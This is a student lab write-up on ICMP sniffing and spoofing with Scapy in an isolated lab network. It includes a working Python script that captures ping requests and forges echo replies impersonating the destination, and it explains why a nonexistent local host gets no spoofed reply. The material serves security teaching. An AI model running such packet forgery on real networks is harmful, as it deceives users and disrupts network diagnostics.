# Lab 2.4 - Sniffing and-then Spoofing: Capturing ICMP Echo Requests and automatically generating spoofed Echo Replies to impersonate the destination.

**Objective**
The objective of this lab is to use Scapy to capture ICMP Echo Requests and automatically generate spoofed Echo Replies that appear to originate from the intended destination.

**Procedure**

Task 1. User1 sends an ICMP Echo Request to a destination.
Task 2. Your attacker VM captures that request using Scapy.
Task 3. Program creates a fake ICMP Echo Reply, pretending to be the destination.
Task 4. User1 receives the forged reply, potentially making it appear that the destination is reachable.

**Details**
| IP Address | Purpose |

| 10.9.0.1 | Attacker VM
| 10.9.0.6 | User1 container that generates ping requests
**Ping Requests**
| ping -c 4 1.2.3.4 | The first IP address User1 (10.9.0.6) attempted to ping. User1 container received ICMP Echo replies successfully.
| ping -c 4 8.8.8.8 | Google's public DNS server. The second IP address User1 (10.9.0.6) attempted to ping. User1 container received ICMP Echo replies successfully.
| ping -c 4 10.9.0.99 | The third IP address User1 (10.9.0.6) attempted to ping. The result is "Destination Host Unreachable." This occurred because no device was using that IP address on the local network. Since User1 could not find the device's MAC address using ARP, it could not send the ICMP request. As a result, the attacker had no packet to capture or spoof a reply to.

### Creating the Python sniff-and-spoof script on the attacker VM
3. Open a terminal on your attacker VM. Run:

  ```javascript
  nano /home/seed/sniff_spoof.py
  ```
   
5. Copy the following Python code:

  ```javascript
#!/usr/bin/env python3
from scapy.all import *

def sniff_and_spoof(packet):
    if ICMP in packet:
        ip = IP(src=packet[IP].dst, dst=packet[IP].src)
        icmp = ICMP(type=0, id=packet[ICMP].id, seq=packet[ICMP].seq)

        raw_data = packet[Raw].load if Raw in packet else b""
        newpacket = ip/icmp/raw_data

        send(newpacket, verbose=0)

pkt = sniff(
    iface="br-c84de5716c52",
    filter="icmp[icmptype] == icmp-echo",
    prn=sniff_and_spoof
)

  ```

### Conclusion

The lab demonstrates a limitation of our sniff-and-spoof program.
- For 1.2.3.4 and 8.8.8.8, User1 can send ICMP Echo Requests that our attacker VM can capture.
- For 10.9.0.99, User1 must first use ARP to find the destination's MAC address.
- Since 10.9.0.99 does not exist in the lab network, ARP resolution fails, and no ICMP Echo Request is sent for our program to spoof a response to.
